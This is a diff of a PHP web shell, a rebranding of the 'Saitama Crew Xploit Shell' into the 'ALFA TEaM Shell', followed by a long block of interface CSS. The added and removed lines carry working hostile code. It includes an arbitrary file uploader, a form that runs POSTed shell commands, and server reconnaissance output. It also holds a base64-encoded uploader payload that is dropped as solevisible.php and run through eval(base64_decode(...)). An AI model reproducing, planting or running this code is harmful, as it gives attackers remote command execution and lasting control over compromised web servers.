@@ -823,7 +824,7 @@ if($safe_mode){$r = "<b style='color: red'>On</b>";}else{$r = "<b style='color: 
 echo "<br><b style='color: #7CFC00'>OS: </font><font color=white>" . PHP_OS . "</font><br>";
 echo "<b style='color: #7CFC00'>Software: </font><font color=white>" . $_SERVER ['SERVER_SOFTWARE'] . "</font><br>";
 echo "PHP Version: <font color=white>" . PHP_VERSION .  "</font><br />";
-echo "PWD:<font color=#00ffff> " . str_replace("\\","/",@saitamaGetCwd()) . "/<br />";
+echo "PWD:<font color=#FFFFFF> " . str_replace("\\","/",@alfaGetCwd()) . "/<br />";
 echo "<b style='color: #7CFC00'>Safe Mode : $r<br>";
 echo"<font color=#7CFC00>Disable functions : </font>";
 $disfun = @ini_get('disable_functions');
@@ -834,7 +835,7 @@ echo"</font><br>";
 echo "<b style='color: #7CFC00'>Your Ip Address is :  </font><font color=white>" . $_SERVER['REMOTE_ADDR'] . "</font><br>";
 echo "<b style='color: #7CFC00'>Server Ip Address is :  </font><font color=white>".(function_exists('gethostbyname')?@gethostbyname($_SERVER["HTTP_HOST"]):'???')."</font><br><p>";
 echo '<hr><center><form onSubmit="this.upload.disabled=true;this.cwd.value = btoa(unescape(encodeURIComponent(this.cwd.value)));" action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-echo 'CWD: <input type="text" name="cwd" value="'.str_replace("\\","/",@saitamaGetCwd()).'/" size="59"><p><input type="file" name="file" size="45"><input name="upload" type="submit" id="_upl" value="Upload"></p></form></center>';
+echo 'CWD: <input type="text" name="cwd" value="'.str_replace("\\","/",@alfaGetCwd()).'/" size="59"><p><input type="file" name="file" size="45"><input name="upload" type="submit" id="_upl" value="Upload"></p></form></center>';
 if(isset($_FILES['file'])){
 if(@move_uploaded_file($_FILES['file']['tmp_name'], __ZGVjb2Rlcg(@$_POST['cwd']).'/'.$_FILES['file']['name'])){echo '<b><font color="#7CFC00"><center>Upload Successfully ;)</font></a><font color="#7CFC00"></b><br><br></center>'; }
 else{echo '<center><b><font color="#7CFC00">Upload failed :(</font></a><font color="#7CFC0"></b></center><br><br>'; }
@@ -843,8 +844,8 @@ echo '<hr><form onSubmit="this.execute.disabled=true;this.command_solevisible.va
 <hr><pre>';
 if(isset($_POST['command_solevisible'])){
 if(strtolower(substr(PHP_OS,0,3))=="win")$separator='&';else $separator=';';
-$solevisible = "cd '".addslashes(str_replace("\\","/",@saitamaGetCwd()))."'".$separator."".__ZGVjb2Rlcg($_POST['command_solevisible']);
-echo saitamaEx($solevisible);
+$solevisible = "cd '".addslashes(str_replace("\\","/",@alfaGetCwd()))."'".$separator."".__ZGVjb2Rlcg($_POST['command_solevisible']);
+echo alfaEx($solevisible);
 }
 echo'</pre>
 </body></html>';
@@ -878,7 +879,7 @@ if(strtolower(substr(PHP_OS,0,3))=="win")
 $GLOBALS['sys']='win';
 else
 $GLOBALS['sys']='unix';
-$GLOBALS['home_cwd'] = @saitamaGetCwd();
+$GLOBALS['home_cwd'] = @alfaGetCwd();
 $GLOBALS["need_to_update_header"] = "false";
 $GLOBALS['glob_chdir_false'] = false;
 if(isset($_POST['c'])){
@@ -886,16 +887,16 @@ if(!@chdir($_POST['c'])){
 	$GLOBALS['glob_chdir_false'] = true;
 }
 }
-$GLOBALS['cwd'] = (isset($_POST['c']) && @is_dir($_POST['c']) ?$_POST['c']:@saitamaGetCwd());
+$GLOBALS['cwd'] = (isset($_POST['c']) && @is_dir($_POST['c']) ?$_POST['c']:@alfaGetCwd());
 if($GLOBALS['glob_chdir_false']){
-	$GLOBALS['cwd'] = (isset($_POST['c']) && !empty($_POST['c']) ? $_POST['c'] : @saitamaGetCwd());
+	$GLOBALS['cwd'] = (isset($_POST['c']) && !empty($_POST['c']) ? $_POST['c'] : @alfaGetCwd());
 }
 if($GLOBALS['sys'] == 'win'){
 $GLOBALS['home_cwd'] = str_replace("\\", "/", $GLOBALS['home_cwd']);
 $GLOBALS['cwd'] = str_replace("\\", "/", $GLOBALS['cwd']);
 }
 if($GLOBALS['cwd'][strlen($GLOBALS['cwd'])-1] != '/' )$GLOBALS['cwd'] .= '/';
-if(!function_exists('sys_get_temp_dir')){function sys_get_temp_dir() {foreach (array('TMP', 'TEMP', 'TMPDIR') as $env_var) {if ($temp = getenv($env_var)) {return $temp;}}$temp = tempnam($GLOBALS['__file_path'], '');if (_saitama_file_exists($temp,false)) {unlink($temp);return dirname($temp);}return null;}}
+if(!function_exists('sys_get_temp_dir')){function sys_get_temp_dir() {foreach (array('TMP', 'TEMP', 'TMPDIR') as $env_var) {if ($temp = getenv($env_var)) {return $temp;}}$temp = tempnam($GLOBALS['__file_path'], '');if (_alfa_file_exists($temp,false)) {unlink($temp);return dirname($temp);}return null;}}
 if(!function_exists("mb_strlen")){
 	function mb_strlen($str, $c=""){
 		return strlen($str);
@@ -906,13 +907,13 @@ if(!function_exists("mb_substr")){
 		return substr($str, $start, $end);
 	}
 }
-define("saitama_TEMPDIR", (function_exists("sys_get_temp_dir") ? (@is_writable(str_replace('\\','/',sys_get_temp_dir()))?sys_get_temp_dir():(@is_writable('.')?'.':false)) : false));
-function saitamahead(){
-$GLOBALS['__saitama_SHELL_CODE'] = 'PD9waHAgZWNobyAiPHRpdGxlPlNvbGV2aXNpYmxlIFVwbG9hZGVyPC90aXRsZT5cbjxib2R5IGJnY29sb3I9IzAwMDAwMD5cbjxicj5cbjxjZW50ZXI+PGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjxiPllvdXIgSXAgQWRkcmVzcyBpczwvYj4gPGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjwvZm9udD48L2NlbnRlcj5cbjxiaWc+PGZvbnQgY29sb3I9XCIjN0NGQzAwXCI+PGNlbnRlcj5cbiI7ZWNobyAkX1NFUlZFUlsnUkVNT1RFX0FERFInXTtlY2hvICI8L2NlbnRlcj48L2ZvbnQ+PC9hPjxmb250IGNvbG9yPVwiIzdDRkMwMFwiPlxuPGJyPlxuPGJyPlxuPGNlbnRlcj48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48YmlnPlNvbGV2aXNpYmxlIFVwbG9hZCBBcmVhPC9iaWc+PC9mb250PjwvYT48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48L2ZvbnQ+PC9jZW50ZXI+PGJyPlxuPGNlbnRlcj48Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnIG5hbWU9J3VwbG9hZGVyJz4iO2VjaG8gJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI0NSI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT48L2NlbnRlcj4nO2lmKGlzc2V0KCRfUE9TVFsnX3VwbCddKSYmJF9QT1NUWydfdXBsJ109PSAiVXBsb2FkIil7aWYoQG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkge2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBTdWNjZXNzZnVsbHkgOyk8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO31lbHNle2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBmYWlsZWQgOig8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO319ZWNobyAnPGNlbnRlcj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjMwcHg7IGJhY2tncm91bmQ6IHVybCgmcXVvdDtodHRwOi8vc29sZXZpc2libGUuY29tL2ltYWdlcy9iZ19lZmZlY3RfdXAuZ2lmJnF1b3Q7KSByZXBlYXQteCBzY3JvbGwgMCUgMCUgdHJhbnNwYXJlbnQ7IGNvbG9yOiByZWQ7IHRleHQtc2hhZG93OiA4cHggOHB4IDEzcHg7Ij48c3Ryb25nPjxiPjxiaWc+c29sZXZpc2libGVAZ21haWwuY29tPC9iPjwvYmlnPjwvc3Ryb25nPjwvc3Bhbj48L2NlbnRlcj4nOz8+';
-$saitama_uploader = '$x = base64_decode("'.$GLOBALS['__saitama_SHELL_CODE'].'");$solevisible = fopen("solevisible.php","w");fwrite($solevisible,$x);';
-define("saitama_UPLOADER", "eval(base64_decode('".__ZW5jb2Rlcg($saitama_uploader)."'))");
+define("ALFA_TEMPDIR", (function_exists("sys_get_temp_dir") ? (@is_writable(str_replace('\\','/',sys_get_temp_dir()))?sys_get_temp_dir():(@is_writable('.')?'.':false)) : false));
+function alfahead(){
+$GLOBALS['__ALFA_SHELL_CODE'] = 'PD9waHAgZWNobyAiPHRpdGxlPlNvbGV2aXNpYmxlIFVwbG9hZGVyPC90aXRsZT5cbjxib2R5IGJnY29sb3I9IzAwMDAwMD5cbjxicj5cbjxjZW50ZXI+PGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjxiPllvdXIgSXAgQWRkcmVzcyBpczwvYj4gPGZvbnQgY29sb3I9XCJ3aGl0ZVwiPjwvZm9udD48L2NlbnRlcj5cbjxiaWc+PGZvbnQgY29sb3I9XCIjN0NGQzAwXCI+PGNlbnRlcj5cbiI7ZWNobyAkX1NFUlZFUlsnUkVNT1RFX0FERFInXTtlY2hvICI8L2NlbnRlcj48L2ZvbnQ+PC9hPjxmb250IGNvbG9yPVwiIzdDRkMwMFwiPlxuPGJyPlxuPGJyPlxuPGNlbnRlcj48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48YmlnPlNvbGV2aXNpYmxlIFVwbG9hZCBBcmVhPC9iaWc+PC9mb250PjwvYT48Zm9udCBjb2xvcj1cIiM3Q0ZDMDBcIj48L2ZvbnQ+PC9jZW50ZXI+PGJyPlxuPGNlbnRlcj48Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnIG5hbWU9J3VwbG9hZGVyJz4iO2VjaG8gJzxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJmaWxlIiBzaXplPSI0NSI+PGlucHV0IG5hbWU9Il91cGwiIHR5cGU9InN1Ym1pdCIgaWQ9Il91cGwiIHZhbHVlPSJVcGxvYWQiPjwvZm9ybT48L2NlbnRlcj4nO2lmKGlzc2V0KCRfUE9TVFsnX3VwbCddKSYmJF9QT1NUWydfdXBsJ109PSAiVXBsb2FkIil7aWYoQG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkge2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBTdWNjZXNzZnVsbHkgOyk8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO31lbHNle2VjaG8gJzxiPjxmb250IGNvbG9yPSIjN0NGQzAwIj48Y2VudGVyPlVwbG9hZCBmYWlsZWQgOig8L2ZvbnQ+PC9hPjxmb250IGNvbG9yPSIjN0NGQzAwIj48L2I+PGJyPjxicj4nO319ZWNobyAnPGNlbnRlcj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjMwcHg7IGJhY2tncm91bmQ6IHVybCgmcXVvdDtodHRwOi8vc29sZXZpc2libGUuY29tL2ltYWdlcy9iZ19lZmZlY3RfdXAuZ2lmJnF1b3Q7KSByZXBlYXQteCBzY3JvbGwgMCUgMCUgdHJhbnNwYXJlbnQ7IGNvbG9yOiByZWQ7IHRleHQtc2hhZG93OiA4cHggOHB4IDEzcHg7Ij48c3Ryb25nPjxiPjxiaWc+c29sZXZpc2libGVAZ21haWwuY29tPC9iPjwvYmlnPjwvc3Ryb25nPjwvc3Bhbj48L2NlbnRlcj4nOz8+';
+$alfa_uploader = '$x = base64_decode("'.$GLOBALS['__ALFA_SHELL_CODE'].'");$solevisible = fopen("solevisible.php","w");fwrite($solevisible,$x);';
+define("ALFA_UPLOADER", "eval(base64_decode('".__ZW5jb2Rlcg($alfa_uploader)."'))");
 if(!isset($_POST['ajax'])){
-function saitama_GetDisable_Function(){
+function Alfa_GetDisable_Function(){
 $disfun = @ini_get('disable_functions');
 $afa = '<span class="header_show_all">All Functions Accessible</span>';
 if(empty($disfun))return($afa);
@@ -941,23 +942,23 @@ if($i <= count($func)){
 $all = array_values(array_merge($black_list, $allow_list));
 return('<span class="disable_functions">'.implode(" | ", $all).'</span>');
 }
-return('<span class="disable_functions">'.$dis.'</span><a id="menu_opt_GetDisFunc" href=javascript:void(0) onclick="saitama_can_add_opt = true;g(\'GetDisFunc\',null,\'wp\');"><span class="header_show_all">Show All ('.$i.')</span></a>');
+return('<span class="disable_functions">'.$dis.'</span><a id="menu_opt_GetDisFunc" href=javascript:void(0) onclick="alfa_can_add_opt = true;g(\'GetDisFunc\',null,\'wp\');"><span class="header_show_all">Show All ('.$i.')</span></a>');
 }
-function saitamaNum(){
+function AlfaNum(){
 $args = func_get_args();
-$saitamax = array();
+$alfax = array();
 $find = array();
 for($i=1;$i<=10;$i++){
-$saitamax[] = $i;
+$alfax[] = $i;
 }
 foreach($args as $arg){
 $find[] = $arg;
 }
 echo '<script>';
-foreach($saitamax as $saitama){
-if(in_array($saitama,$find))
+foreach($alfax as $alfa){
+if(in_array($alfa,$find))
 continue;
-echo 'saitama'.$saitama."_=";
+echo 'alfa'.$alfa."_=";
 }
 echo '""</script>';
 }
@@ -1054,27 +1055,27 @@ echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <meta name="ROBOTS" content="NOINDEX, NOFOLLOW" />
-<link href="'.__showicon('saitamamini').'" rel="icon" type="image/x-icon"/>
-<title>..:: '.$_SERVER['HTTP_HOST'].' ~ Saitama Crew Xploit Shell - v'.__saitama_VERSION__.'-'.__saitama_CODE_NAME__.' ::..</title>
+<link href="'.__showicon('alfamini').'" rel="icon" type="image/x-icon"/>
+<title>..:: '.$_SERVER['HTTP_HOST'].' ~ ALFA TEaM Shell - v'.__ALFA_VERSION__.'-'.__ALFA_CODE_NAME__.' ::..</title>
 <style type="text/css">';?>
-.hlabale{color:#BF40BF;border-radius:4px;border:1px solid #ff0800;margin-left:7px;padding:2px}#tbl_sympphp tr{text-align:center}#PhpCode,.php-evals-ace,.view_ml_content{position:absolute;top:0;right:0;bottom:0;left:0;background:#1b292b26;top:50px}.editor-view{position:relative;height:100%}.view-content{position:absolute;overflow-y:auto;width:100%;height:93%}::-webkit-scrollbar-track{-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);border-radius:10px;background-color:#000115}::-webkit-scrollbar{width:10px;background-color:#000115}::-webkit-scrollbar-thumb{border-radius:10px;-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);background-color:#1e82b5}.editor-file-name{margin-left:29px;margin-top:4px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.editor-icon{position:absolute}.is_active{background:rgba(49,55,93,.77);border-radius:10px}.history-list{height:88%;overflow-y:auto}.opt-title{position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);color:#E6E6FA;font-size:25px;font-family:monospace}.options_min_badge{visibility:hidden;text-align:center;right:30px;color:#fff;background:#2a8a24;padding:6px;border-radius:50%;width:15px;height:15px;display:inline-block;position:absolute;top:-7px}#cgiloader-minimized,#database_window-minimized,#editor-minimized,#options_window-minimized{display:block;position:fixed;right:-30px;width:30px;height:30px;top:30%;z-index:9999}.minimized-wrapper{position:relative;background:#ff0800;width:44px;height:130px;cursor:pointer;border-bottom-left-radius:5px;border-top-left-radius:5px}.minimized-text{transform:rotate(-90deg);color:wheat;font-size:x-large;display:inline-block;position:absolute;right:-51px;width:129px;top:-10px;border-top-left-radius:4%;height:56px;padding:3px}.close-button,.editor-minimize{height:26px;width:38px;right:7px;background:#ff0800;cursor:pointer;position:absolute;box-sizing:border-box;line-height:50px;display:inline-block;top:17px;border-radius:100px}.editor-minimize{right:50px}.close-button:after,.close-button:before,.editor-minimize:before{transform:rotate(-45deg);content:"";position:absolute;top:63%;right:6px;margin-top:-5px;margin-left:-25px;display:block;height:4px;width:27px;background-color:rgba(216,207,207,.75);transition:all .25s ease-out}.editor-minimize:before{transform:rotate(0)}.close-button:after{transform:rotate(-135deg)}.close-button:hover:after,.close-button:hover:before,.editor-minimize:hover:before{background-color:red}.close-button:hover,.editor-minimize:hover{background-color:rgba(39,66,80,.96)}#cgiloader,#database_window,#editor,#options_window{display:none;position:fixed;top:0;width:100%;height:100%;z-index:20}.editor-wrapper{width:100%;height:100%;position:relative;top:1%}.editor-header{width:97%;background:rgba(21,66,88,.93);height:37px;margin-left:13px;position:relative;border-top-left-radius:15px;border-top-right-radius:15px}.editor-path{position:absolute;font-size:x-large;margin-left:10px;top:6px;color:#ff0800}.editor-modal{position:relative;top:0;background-color:rgba(0,1,23,.95);height:90%;margin-left:20%;margin-right:2%;border:2px #ff0800 solid}.editor-explorer{width:19%;height:90%;background-color:rgba(0,1,23,.94);position:absolute;z-index:2;left:1%;border:2px #ff0800 solid}.editor-controller{position:relative;top:-13px}.file-holder{position:relative;width:100%;height:30px}.file-holder>.history{position:absolute;color:#03b3a3;cursor:pointer;left:5px;font-size:18px;font-family:sans-serif;width:89%;height:100%;z-index:3;border-radius:10px;transition:background-color .6s ease-out}.file-holder>.history-close{display:block;opacity:0;position:absolute;right:2px;width:20px;top:4px;text-align:center;cursor:pointer;color:#fff;background:red;border-radius:100px;font-family:monospace;z-index:10;transition:opacity .6s ease-out;font-size:15px;height:19px}.file-holder>.history:hover{background-color:#646464}.editor-explorer>.hheader{position:relative;color:#14ff07;border-bottom:2px #206aa2 solid;text-align:center;font-family:sans-serif;margin-bottom:10px;height:55px}.editor-search{position:absolute;bottom:7px;left:31px}.hheader-text{position:absolute;left:8px;top:2px}.history-clear{position:absolute;right:8px;top:2px;cursor:pointer}.editor-body{position:relative;margin-left:3px;height:100%}.editor-anim-close{-webkit-animation:editorClose .8s ease-in-out forwards;-moz-animation:editorClose .8s ease-in-out forwards;-ms-animation:editorClose .8s ease-in-out forwards;animation:editorClose .8s ease-in-out forwards}@keyframes editorClose{0%{visibility:1;opacity:1}100%{visibility:0;opacity:0}}.editor-anim-minimize{-webkit-animation:editorMinimize .8s ease-in-out forwards;-moz-animation:editorMinimize .8s ease-in-out forwards;-ms-animation:editorMinimize .8s ease-in-out forwards;animation:editorMinimize .8s ease-in-out forwards}@keyframes editorMinimize{0%{right:0;opacity:1}100%{right:-2000px;opacity:0}}.editor-anim-show{-webkit-animation:editorShow .8s ease-in-out forwards;-moz-animation:editorShow .8s ease-in-out forwards;-ms-animation:editorShow .8s ease-in-out forwards;animation:editorShow .8s ease-in-out forwards}@keyframes editorShow{0%{right:-2000px;opacity:0}100%{right:0;opacity:1}}.minimized-show{-webkit-animation:minimizeShow .8s ease-in-out forwards;-moz-animation:minimizeShow .8s ease-in-out forwards;-ms-animation:minimizeShow .8s ease-in-out forwards;animation:minimizeShow .8s ease-in-out forwards}@keyframes minimizeShow{0%{right:-30px;opacity:0}100%{right:0;opacity:1}}.minimized-hide{-webkit-animation:minimizeHide .8s ease-in-out forwards;-moz-animation:minimizeHide .8s ease-in-out forwards;-ms-animation:minimizeHide .8s ease-in-out forwards;animation:minimizeHide .8s ease-in-out forwards}@keyframes minimizeHide{0%{right:0;opacity:1}100%{right:-30px;opacity:0}}.solevisible-text:hover{-webkit-text-shadow:0 0 25px #0f0;-moz-text-shadow:0 0 25px #0f0;-ms-text-shadow:0 0 25px #0f0;text-shadow:0 0 25px #0f0}.update-holder{position:fixed;top:0;background-color:rgba(0,24,29,.72);width:100%;height:100%}.update-content{position:relative}.update-content>a{text-decoration:none;position:absolute;color:rgba(103,167,47,.77);left:24%;margin-top:7%;font-size:40px}.update-close{position:absolute;right:0;margin-right:23px;top:10px;font-size:27px;background-color:#130f50;width:5%;border-radius:100px;cursor:pointer;border:2px #0e265a solid}.update-close:hover{border:2px #00ffff solid;color:red}.filestools{height:auto;width:auto;color:#BF40BF;font-size:12px;font-family:Verdana,Geneva,sans-serif}@-moz-document url-prefix(){#search-input{width:173px}.editor-path{top:3px}}.filters-holder{padding:5px;padding-left:10px}.filters-holder input{width:200px}.filters-holder span{color:#ff0800}#rightclick_menu{width:175px;visibility:hidden;opacity:0;position:fixed;background:#0f304a;color:#555;font-family:sans-serif;font-size:11px;-webkit-transition:opacity .5s ease-in-out;-moz-transition:opacity .5s ease-in-out;-ms-transition:opacity .5s ease-in-out;-o-transition:opacity .5s ease-in-out;transition:opacity .5s ease-in-out;-webkit-box-shadow:-1px 0 17px 0 #8b8b8c;-moz-box-shadow:-1px 0 17px 0 #8b8b8c;box-shadow:-1px 0 17px 0 #8b8b8c;padding:0;border:1px solid #737373;border-radius:10px}#rightclick_menu a{display:block;color:#fff;font-weight:bolder;text-decoration:none;padding:6px 8px 6px 30px;position:relative;padding-left:40px}#rightclick_menu a i.fa,#rightclick_menu a img{height:20px;font-size:17px;width:20px;position:absolute;left:5px;top:2px;padding-left:5px}#rightclick_menu a span{color:#bcb1b3;float:right}#rightclick_menu a:hover{color:#fff;background:#3879d9}#rightclick_menu hr{border:1px solid #ebebeb;border-bottom:0}.cl-popup-fixed{position:fixed;top:0;left:0;width:100%;height:100%;background:#201e1ead}#shortcutMenu-holder{position:absolute;top:40%;left:50%;transform:translate(-50%,-50%);background:#1f1e1edb;height:190px;width:500px;color:#fff}#shortcutMenu-holder>.popup-head{background:#207174;padding:6px;border-top:10px;text-align:center;font-family:sans-serif;color:#fff}#shortcutMenu-holder>form{padding:10px}#shortcutMenu-holder>form>label{display:block}#shortcutMenu-holder>form>input{width:99%;height:24px;margin-top:4px;color:#fff;outline:0;font-size:16px}#shortcutMenu-holder>.popup-foot{float:right;height:30px;margin-right:8px}#shortcutMenu-holder>.popup-foot>button{height:100%;cursor:pointer;color:#fff;outline:0}.php-terminal-output{overflow:auto;height:86%;border:1px solid #ff0800;border-radius:10px}.cmd-history-holder{visibility:hidden;opacity:0;position:absolute;color:#dff3d5;background:#093d58;top:-300px;height:300px;width:calc(69% + -11px);border-radius:10px 10px 0 0;left:calc(2% - 9px);transition:visibility .5s,opacity .5s linear}.cmd-history-holder .commands-history-header{background:#37504e;text-align:center;border-radius:10px 10px 0 0}.cmd-history-icon{width:27px;top:6px;left:calc(69% + 5px);position:absolute;cursor:pointer}.history-cmd-line{padding:4px;border-bottom:1px dashed;cursor:pointer}.history-cmd-line:hover{background:#961111}#myUL,#myUL ul{list-style-type:none}#myUL{margin:0;padding:0}.box{cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.box::before{content:"\2610";color:#000;display:inline-block;margin-right:6px}.check-box::before{content:"\2611";color:#1e90ff}.nested{display:none}.active{display:block}.flag-holder>img{width:20px;vertical-align:middle;padding-left:6px}#options_window .content_options_holder .options_holder{position:relative;display:none;overflow:auto;min-height:300px;max-height:calc(100vh - 100px)}#options_window .content_options_holder .options_holder .header{min-height:50vh}#options_window .content_options_holder .options_holder.option_is_active{display:block}#options_window .content_options_holder .options_tab{padding:5px;margin-left:14px;margin-right:30px;background:#000;border-bottom:7px solid #0f304a;border-left:7px solid #0f304a;border-right:7px solid #0f304a;overflow-x:auto;white-space:nowrap}#filesman_tabs .filesman_tab img,#options_window .content_options_holder .options_tab .tab_name img,.editor-tab-name img,.sql-tabs .sql-tabname img,.terminal-tabs .terminal-tab img{width:10px;vertical-align:middle;margin-left:5px}#filesman_tabs .filesman_tab,#options_window .content_options_holder .options_tab .tab_name,.editor-tab-name,.sql-tabs .sql-newtab,.sql-tabs .sql-tabname,.terminal-tabs .terminal-tab{display:inline-block;background-color:#133d51;border-radius:4px;padding:5px;color:#fff;margin-right:3px;padding:5px;cursor:pointer;margin-bottom:1px;transition:background-color .5s}#filesman_tabs .filesman_tab{min-width:55px;text-align:center}#filesman_tabs .filesman_tab:hover,#options_window .content_options_holder .options_tab .tab_name:hover,.editor-tab-name:hover,.sql-tabs .sql-tabname:hover,.terminal-tabs .terminal-tab:hover{background-color:#a23939}.editor-tabs,.sql-tabs,.terminal-tabs{padding:5px;overflow-x:auto;white-space:nowrap}.options-loader-holder{position:absolute;top:0;left:0;width:100%;height:100%;background:#2b2626c7;z-index:11}.options-loader-holder img{position:absolute;top:32%;left:45%;transform:translate(-50%,-50%);width:100px;animation:spin 2s infinite}#filesman_tabs .filesman_tab.filesman-tab-active,#options_window .content_options_holder .options_tab .tab_name.tab_is_active,.editor-tab-name.editor-tab-active,.sql-tabname.sql-active-tab,.terminal-tab.active-terminal-tab{background-color:#ff0800}.tab-is-done{animation:2s tab_change_color infinite step-end}.stopAjax{color:#fff;font-size:20px;display:inline-block;padding:10px;cursor:pointer}#a_loader{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#2b2626c7;z-index:99}.fmanager-row>td{position:relative}.fmanager-row .symlink_path{position:fixed;max-width:100%;background-color:#0f304a;border-radius:10px;font-size:15px;padding:8px;color:#fdf4f4;border:1px solid #8a8a8a;z-index:1;pointer-events:none}.archive-icons{vertical-align:middle}.archive-type-dir{font-weight:bolder}.archive-type-file{font-weight:unset}.archive-name{cursor:pointer}.archive_dir_holder a{color:#0f0;font-weight:bolder;cursor:pointer}.archive_dir_holder a:hover{color:#fff}.editor-content{height:100%}.editor-content-holder{height:90%}.editor-contents{display:none;position:relative;height:100%}.editor-contents.editor-content-active{display:block}.history-panel-controller{position:absolute;color:#fff;padding:10px;z-index:1000;border-radius:10px;top:50%;left:19%;background-color:#009687;cursor:pointer}.sql-content{display:none;position:relative;min-height:300px}.sql-content.sql-active-content{display:block}.pages-holder{padding:7px}.pages-number{display:inline-block;margin-left:10px}.pages-holder .pages-number a.page-number{padding:5px;background:#0f304a;margin-right:8px;cursor:pointer;width:33px;display:inline-block;text-align:center;border-radius:5px;color:#fff;transition:background .5s}.active-page-number{background:#10925c!important}.pages-number a.page-number:hover{background:#8a8a8a}.terminal-content{height:100%}.terminal-content,.terminal-tab{display:none}.terminal-content.active-terminal-content{display:block;position:relative}.terminal-btn-fontctl{background:#ff0800;width:50px;color:#fff;font-weight:bolder;outline:0;cursor:pointer}.alert-area{max-height:100%;position:fixed;bottom:5px;left:20px;right:20px;z-index:9999}.alert-box{font-size:16px;color:#fff;background:rgba(0,0,0,.9);line-height:1.3em;padding:10px 15px;margin:5px 10px;position:relative;border-radius:5px;transition:opacity .5s ease-in;-webkit-animation:alert-shake .5s ease-in-out;animation:alert-shake .5s ease-in-out}.alert-content-title{font-weight:700}.alert-box.alert-success{background:rgba(56,127,56,.89)}.alert-error{background:rgba(191,54,54,.89)}.alert-box.hide{opacity:0}.alert-close{background:0 0;width:12px;height:12px;position:absolute;top:15px;right:15px}.alert-close:after,.alert-close:before{content:"";width:15px;border-top:solid 2px #fff;position:absolute;top:5px;right:-1px;display:block}.alert-close:before{transform:rotate(45deg)}.alert-close:after{transform:rotate(135deg)}.alert-close:hover:after,.alert-close:hover:before{border-top:solid 2px #d8d8d8}@media (max-width:767px) and (min-width:481px){.alert-area{left:100px;right:100px}}@media (min-width:768px){.alert-area{width:350px;left:auto;right:0;z-index:9999}}@keyframes tab_change_color{0%{background-color:#133d51}50%{background-color:green}}@-webkit-keyframes alert-shake{0%{-webkit-transform:translateX(0)}20%{-webkit-transform:translateX(-10px)}40%{-webkit-transform:translateX(10px)}60%{-webkit-transform:translateX(-10px)}80%{-webkit-transform:translateX(10px)}100%{-webkit-transform:translateX(0)}}@keyframes alert-shake{0%{transform:translateX(0)}20%{transform:translateX(-10px)}40%{transform:translateX(10px)}60%{transform:translateX(-10px)}80%{transform:translateX(10px)}100%{transform:translateX(0)}}.textEffect{position:absolute;width:500px;top:-10px;animation:alert-shake .5s ease-in-out;animation-iteration-count:2}.saitamateam-loader-text{position:absolute;color:#ff0800;top:23%;left:49%;transform:translate(-50%,-50%);font-size:40px;letter-spacing:7px}.saitama-ajax-error{position:absolute;color:#ff0a0a;top:50%;left:50%;transform:translate(-50%,-50%);font-size:30px}.connection-hist-table{margin-left:auto;margin-right:auto;text-align:justify;border-collapse:collapse}.connection-hist-table td,.connection-hist-table th{border:1px solid #ddd;text-align:left;padding:8px}.connection-his-btn{margin-bottom:10px;padding:5px;background:#206920;color:#fff;border:none;outline:0;cursor:pointer;font-weight:700;transition:background .3s}.connection-his-btn.connection-delete{margin:unset;padding:5px;background:red;width:33px;border-radius:3px;transition:background .3s}.connection-delete:hover{background:#f56969!important}.connection-his-btn:hover{background:#30b330}#up_bar_holder{position:fixed;z-index:100000;width:100%}#filesman_tabs{padding:8px;border:1px solid #ff0800;color:#BF40BF;overflow-x:auto;white-space:nowrap}.sortable-ghost{opacity:.5;background:#c8ebfb}.folder-tab-icon{width:16px!important}#filesman-tab-full-path{display:none;position:absolute;pointer-events:none;background:#163746;padding:7px;color:#0f0;border-radius:10px;min-width:58px;z-index:10}#filesman-tab-full-path::after{content:"";position:absolute;top:100%;left:35px;margin-left:-5px;border-width:5px;border-style:solid;pointer-events:none;border-color:#163746 transparent transparent transparent}.mysql-main{height:84vh;position:relative}.mysql-hide-content{display:none}.mysql-query-result-tabs{margin-bottom:10px;padding:3px;border-bottom:4px solid #0f304a}.mysql-main 